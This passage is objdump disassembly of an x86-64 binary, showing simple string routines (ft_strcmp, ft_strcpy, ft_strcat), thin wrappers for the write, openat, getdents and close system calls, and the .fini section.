    327b:	c6 00 00             	movb   $0x0,(%rax)
    327e:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
    3282:	8b 45 fc             	mov    -0x4(%rbp),%eax
    3285:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
    3289:	77 e6                	ja     3271 <ft_bzero+0x21>
    328b:	90                   	nop
    328c:	90                   	nop
    328d:	5d                   	pop    %rbp
    328e:	c3                   	ret    

000000000000328f <ft_strcmp>:
    328f:	f3 0f 1e fa          	endbr64 
    3293:	55                   	push   %rbp
    3294:	48 89 e5             	mov    %rsp,%rbp
    3297:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    329b:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    329f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    32a6:	eb 52                	jmp    32fa <ft_strcmp+0x6b>
    32a8:	8b 45 fc             	mov    -0x4(%rbp),%eax
    32ab:	48 63 d0             	movslq %eax,%rdx
    32ae:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    32b2:	48 01 d0             	add    %rdx,%rax
    32b5:	0f b6 10             	movzbl (%rax),%edx
    32b8:	8b 45 fc             	mov    -0x4(%rbp),%eax
    32bb:	48 63 c8             	movslq %eax,%rcx
    32be:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    32c2:	48 01 c8             	add    %rcx,%rax
    32c5:	0f b6 00             	movzbl (%rax),%eax
    32c8:	38 c2                	cmp    %al,%dl
    32ca:	74 2a                	je     32f6 <ft_strcmp+0x67>
    32cc:	8b 45 fc             	mov    -0x4(%rbp),%eax
    32cf:	48 63 d0             	movslq %eax,%rdx
    32d2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    32d6:	48 01 d0             	add    %rdx,%rax
    32d9:	0f b6 00             	movzbl (%rax),%eax
    32dc:	0f b6 c0             	movzbl %al,%eax
    32df:	8b 55 fc             	mov    -0x4(%rbp),%edx
    32e2:	48 63 ca             	movslq %edx,%rcx
    32e5:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    32e9:	48 01 ca             	add    %rcx,%rdx
    32ec:	0f b6 12             	movzbl (%rdx),%edx
    32ef:	0f b6 d2             	movzbl %dl,%edx
    32f2:	29 d0                	sub    %edx,%eax
    32f4:	eb 31                	jmp    3327 <ft_strcmp+0x98>
    32f6:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
    32fa:	8b 45 fc             	mov    -0x4(%rbp),%eax
    32fd:	48 63 d0             	movslq %eax,%rdx
    3300:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    3304:	48 01 d0             	add    %rdx,%rax
    3307:	0f b6 00             	movzbl (%rax),%eax
    330a:	84 c0                	test   %al,%al
    330c:	75 9a                	jne    32a8 <ft_strcmp+0x19>
    330e:	8b 45 fc             	mov    -0x4(%rbp),%eax
    3311:	48 63 d0             	movslq %eax,%rdx
    3314:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3318:	48 01 d0             	add    %rdx,%rax
    331b:	0f b6 00             	movzbl (%rax),%eax
    331e:	84 c0                	test   %al,%al
    3320:	75 86                	jne    32a8 <ft_strcmp+0x19>
    3322:	b8 00 00 00 00       	mov    $0x0,%eax
    3327:	5d                   	pop    %rbp
    3328:	c3                   	ret    

0000000000003329 <ft_strcpy>:
    3329:	f3 0f 1e fa          	endbr64 
    332d:	55                   	push   %rbp
    332e:	48 89 e5             	mov    %rsp,%rbp
    3331:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    3335:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    3339:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    3340:	eb 23                	jmp    3365 <ft_strcpy+0x3c>
    3342:	8b 45 fc             	mov    -0x4(%rbp),%eax
    3345:	48 63 d0             	movslq %eax,%rdx
    3348:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    334c:	48 01 d0             	add    %rdx,%rax
    334f:	8b 55 fc             	mov    -0x4(%rbp),%edx
    3352:	48 63 ca             	movslq %edx,%rcx
    3355:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    3359:	48 01 ca             	add    %rcx,%rdx
    335c:	0f b6 00             	movzbl (%rax),%eax
    335f:	88 02                	mov    %al,(%rdx)
    3361:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
    3365:	8b 45 fc             	mov    -0x4(%rbp),%eax
    3368:	48 63 d0             	movslq %eax,%rdx
    336b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    336f:	48 01 d0             	add    %rdx,%rax
    3372:	0f b6 00             	movzbl (%rax),%eax
    3375:	84 c0                	test   %al,%al
    3377:	75 c9                	jne    3342 <ft_strcpy+0x19>
    3379:	8b 45 fc             	mov    -0x4(%rbp),%eax
    337c:	48 63 d0             	movslq %eax,%rdx
    337f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    3383:	48 01 d0             	add    %rdx,%rax
    3386:	c6 00 00             	movb   $0x0,(%rax)
    3389:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    338d:	5d                   	pop    %rbp
    338e:	c3                   	ret    

000000000000338f <ft_strcat>:
    338f:	f3 0f 1e fa          	endbr64 
    3393:	55                   	push   %rbp
    3394:	48 89 e5             	mov    %rsp,%rbp
    3397:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    339b:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    339f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    33a6:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
    33ad:	eb 04                	jmp    33b3 <ft_strcat+0x24>
    33af:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
    33b3:	8b 45 fc             	mov    -0x4(%rbp),%eax
    33b6:	48 63 d0             	movslq %eax,%rdx
    33b9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    33bd:	48 01 d0             	add    %rdx,%rax
    33c0:	0f b6 00             	movzbl (%rax),%eax
    33c3:	84 c0                	test   %al,%al
    33c5:	75 e8                	jne    33af <ft_strcat+0x20>
    33c7:	eb 27                	jmp    33f0 <ft_strcat+0x61>
    33c9:	8b 45 f8             	mov    -0x8(%rbp),%eax
    33cc:	48 63 d0             	movslq %eax,%rdx
    33cf:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    33d3:	48 01 d0             	add    %rdx,%rax
    33d6:	8b 55 fc             	mov    -0x4(%rbp),%edx
    33d9:	48 63 ca             	movslq %edx,%rcx
    33dc:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    33e0:	48 01 ca             	add    %rcx,%rdx
    33e3:	0f b6 00             	movzbl (%rax),%eax
    33e6:	88 02                	mov    %al,(%rdx)
    33e8:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
    33ec:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
    33f0:	8b 45 f8             	mov    -0x8(%rbp),%eax
    33f3:	48 63 d0             	movslq %eax,%rdx
    33f6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    33fa:	48 01 d0             	add    %rdx,%rax
    33fd:	0f b6 00             	movzbl (%rax),%eax
    3400:	84 c0                	test   %al,%al
    3402:	75 c5                	jne    33c9 <ft_strcat+0x3a>
    3404:	8b 45 fc             	mov    -0x4(%rbp),%eax
    3407:	48 63 d0             	movslq %eax,%rdx
    340a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    340e:	48 01 d0             	add    %rdx,%rax
    3411:	c6 00 00             	movb   $0x0,(%rax)
    3414:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    3418:	5d                   	pop    %rbp
    3419:	c3                   	ret    

000000000000341a <syscall_write>:
    341a:	f3 0f 1e fa          	endbr64 
    341e:	55                   	push   %rbp
    341f:	48 89 e5             	mov    %rsp,%rbp
    3422:	89 7d ec             	mov    %edi,-0x14(%rbp)
    3425:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    3429:	89 55 e8             	mov    %edx,-0x18(%rbp)
    342c:	b8 01 00 00 00       	mov    $0x1,%eax
    3431:	8b 7d ec             	mov    -0x14(%rbp),%edi
    3434:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
    3438:	8b 55 e8             	mov    -0x18(%rbp),%edx
    343b:	0f 05                	syscall 
    343d:	89 45 fc             	mov    %eax,-0x4(%rbp)
    3440:	8b 45 fc             	mov    -0x4(%rbp),%eax
    3443:	5d                   	pop    %rbp
    3444:	c3                   	ret    

0000000000003445 <syscall_openat>:
    3445:	f3 0f 1e fa          	endbr64 
    3449:	55                   	push   %rbp
    344a:	48 89 e5             	mov    %rsp,%rbp
    344d:	89 7d ec             	mov    %edi,-0x14(%rbp)
    3450:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    3454:	89 55 e8             	mov    %edx,-0x18(%rbp)
    3457:	b8 01 01 00 00       	mov    $0x101,%eax
    345c:	8b 7d ec             	mov    -0x14(%rbp),%edi
    345f:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
    3463:	8b 55 e8             	mov    -0x18(%rbp),%edx
    3466:	0f 05                	syscall 
    3468:	89 45 fc             	mov    %eax,-0x4(%rbp)
    346b:	8b 45 fc             	mov    -0x4(%rbp),%eax
    346e:	5d                   	pop    %rbp
    346f:	c3                   	ret    

0000000000003470 <syscall_getdents>:
    3470:	f3 0f 1e fa          	endbr64 
    3474:	55                   	push   %rbp
    3475:	48 89 e5             	mov    %rsp,%rbp
    3478:	89 7d ec             	mov    %edi,-0x14(%rbp)
    347b:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    347f:	89 55 e8             	mov    %edx,-0x18(%rbp)
    3482:	b8 4e 00 00 00       	mov    $0x4e,%eax
    3487:	8b 7d ec             	mov    -0x14(%rbp),%edi
    348a:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
    348e:	8b 55 e8             	mov    -0x18(%rbp),%edx
    3491:	0f 05                	syscall 
    3493:	89 45 fc             	mov    %eax,-0x4(%rbp)
    3496:	8b 45 fc             	mov    -0x4(%rbp),%eax
    3499:	5d                   	pop    %rbp
    349a:	c3                   	ret    

000000000000349b <syscall_close>:
    349b:	f3 0f 1e fa          	endbr64 
    349f:	55                   	push   %rbp
    34a0:	48 89 e5             	mov    %rsp,%rbp
    34a3:	89 7d ec             	mov    %edi,-0x14(%rbp)
    34a6:	b8 03 00 00 00       	mov    $0x3,%eax
    34ab:	8b 55 ec             	mov    -0x14(%rbp),%edx
    34ae:	89 d7                	mov    %edx,%edi
    34b0:	0f 05                	syscall 
    34b2:	89 45 fc             	mov    %eax,-0x4(%rbp)
    34b5:	90                   	nop
    34b6:	5d                   	pop    %rbp
    34b7:	c3                   	ret    

Disassembly of section .fini:

00000000000034b8 <_fini>:
    34b8:	f3 0f 1e fa          	endbr64 
    34bc:	48 83 ec 08          	sub    $0x8,%rsp
    34c0:	48 83 c4 08          	add    $0x8,%rsp
    34c4:	c3                   	ret    
